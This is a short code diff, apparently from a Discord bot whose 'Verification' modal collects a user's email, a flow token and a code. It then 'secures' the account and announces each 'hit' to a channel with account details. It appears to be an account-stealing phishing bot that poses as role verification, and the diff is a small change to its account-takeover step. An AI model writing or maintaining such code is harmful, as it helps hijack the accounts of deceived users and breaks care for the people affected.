@@ -47,7 +47,7 @@ class MyModalTwo(ui.Modal, title="Verification"):
             "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
         )
 
-        finalEmbeds = await startSecuringAccount(self.email, self.flowtoken, self.box_three.value)
+        finalEmbeds = await asyncio.to_thread(startSecuringAccount, self.email, self.flowtoken, self.box_three.value)
         
         if not finalEmbeds:
 
@@ -66,5 +66,5 @@ class MyModalTwo(ui.Modal, title="Verification"):
         await hits_channel.send("@everyone **Successfully secured an account.**")
         await hits_channel.send(
             embed = finalEmbeds[0],
-            view = accountInfo(finalEmbeds[1], interaction.user)
+            view = accountInfo(finalEmbeds[1], finalEmbeds[2], interaction.user)
         )
